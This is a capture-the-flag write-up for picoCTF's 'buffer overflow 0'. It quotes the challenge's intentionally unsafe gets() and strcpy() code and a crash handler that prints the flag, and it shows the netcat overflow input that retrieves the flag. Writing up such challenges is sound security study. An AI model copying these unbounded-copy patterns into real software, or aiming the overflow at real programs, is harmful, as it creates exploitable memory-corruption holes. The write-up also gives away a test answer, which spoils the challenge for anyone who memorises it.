# buffer overflow 0

## Challenge Overview

The challenge provides a **vulnerable C binary** and a netcat connection.
The goal is to trigger a buffer overflow to leak the flag.

---

## Vulnerability

Reading the source code reveals two key issues:

**1. `gets()` has no bounds checking:**
```c
char buf1[100];
gets(buf1);        // ❌ reads unlimited input into a 100-byte buffer
```

**2. `strcpy()` copies into an undersized buffer:**
```c
void vuln(char *input) {
    char buf2[16];
    strcpy(buf2, input);   // ❌ no bounds check — overflows with >16 bytes
}
```

**3. A SIGSEGV handler prints the flag on crash:**
```c
void sigsegv_handler(int sig) {
    printf("%s\n", flag);   // prints flag on segfault
    fflush(stdout);
    exit(1);
}
```

The flag is loaded into memory at startup:
```c
fgets(flag, FLAGSIZE_MAX, f);
signal(SIGSEGV, sigsegv_handler);  // register the handler
```

So the attack plan is simple: **send enough input to overflow `buf2` and trigger a segfault**, which fires the signal handler and prints the flag.

---

## Exploitation

### Step 1 — Trigger the Overflow

We connect via netcat and send a long input that overflows `buf2[16]`, corrupting the stack and causing a segmentation fault:

```bash
nc saturn.picoctf.net 55248
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

### Step 2 — Flag Printed by Signal Handler

The overflow corrupts the return address, the program crashes with `SIGSEGV`, and `sigsegv_handler` fires — printing the flag before exit.

🏁 Flag retrieved.

---
